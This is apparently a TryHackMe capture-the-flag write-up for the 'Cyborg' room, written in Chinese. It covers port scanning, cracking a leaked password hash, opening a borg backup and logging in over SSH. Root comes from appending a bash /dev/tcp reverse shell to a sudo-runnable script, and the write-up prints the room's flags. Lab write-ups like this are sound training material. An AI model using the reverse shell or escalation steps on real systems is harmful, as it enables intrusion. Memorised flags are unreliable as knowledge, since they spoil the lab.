# Cyborg Writeup
> URL : https://tryhackme.com/room/cyborgt8
IP :  10.10.210.57 

## Recon
- 老梗 `nmap -A  10.10.210.5`
	- ![](https://i.imgur.com/FxeAXB1.png)
-  Scan the machine, how many ports are open? 
	-  `2` 
-  What service is running on port 22?
	-  `SSH`
-  What service is running on port 80?
	- `HTTP`
- `python3 dirsearch.py -u http://10.10.210.57/ -e all`
	- `/admin/`
	- `/etc/`
## 解密
- 先從 `/etc/` 路徑開始看裡面有啥
	- http://10.10.210.57/etc
	- ![](https://i.imgur.com/ViOQB9W.png)

- 找到路徑底下有一個 `passwd`
	- http://10.10.210.57/etc/squid/passwd
		- `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
`
		- 看起來是 hash 格式，直接複製出來給約翰
		- `john a.txt --wordlist=/opt/rockyou`
		- ![](https://i.imgur.com/WZB1ZHG.png)
			- 帳號 : `music_archive`
			- 密碼 : `squidward`
## 尋寶
- 去逛 `/admin/`
	- 發現有 Archive 可以下載
	- ![](https://i.imgur.com/FnMkdhB.png)
- 解開之後發現是一種奇怪格式
	- ![](https://i.imgur.com/i3bMeZ8.png)
	- 檔案都是 binary 無法 print
	- Readme 提醒我們可以去看 https://borgbackup.readthedocs.io/
	- borg 是一種備份程式
- 嘗試簡單的看完說明後
	- `borg list .`
		- 輸入密碼，剛剛約翰破出來的 `squidward`
		- 可以看到一些資訊
	- `borg mount . ../a`
		- 把檔案掛載起來
		- ![](https://i.imgur.com/eGdSZbu.png)

- 發現掛載的檔案裡面有 note
	- ![](https://i.imgur.com/YSBGSvx.png)
	- `alex:S3cretP@s3`
	- 看起來就很像帳密

## 進入系統
- 用 ssh 搭配帳密登入
	- ![](https://i.imgur.com/Cz2cN5e.png)
	- 取得 user flag
	- ![](https://i.imgur.com/7b23Lda.png)
	- `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`
- 嘗試提權
	- 先用 sudo -l 看我們有什麼權限
	- ![](https://i.imgur.com/FYjU6oy.png)
	- 發現我們可以用 `sudo` 執行 `/etc/mp3backups/backup.sh`

- 觀察權限
	- ![](https://i.imgur.com/9rlPjU5.png)
	- 發現我們是這個檔案的擁有者，但我們不能修改他
	- 不過可以透過 `chmod +w` 新增 Write 權限

- 插入 shell
	- `echo "bash -c 'bash -i >& /dev/tcp/10.13.21.55/7877 0>&1'" >> /etc/mp3backups/backup.sh`
	- 直接用 reverse shell 插入檔案最下方
- 執行 shell
	- 攻擊機開啟監聽
		- `nc -vlk 7877`
	- 被駭機用 sudo 執行該檔案
		- `sudo /etc/mp3backups/backup.sh`
	- 拿到 root shell!
		- ![](https://i.imgur.com/xEM5R4U.png)
- 貓根旗幟
	- ![](https://i.imgur.com/KW4V2yi.png)
	- `flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`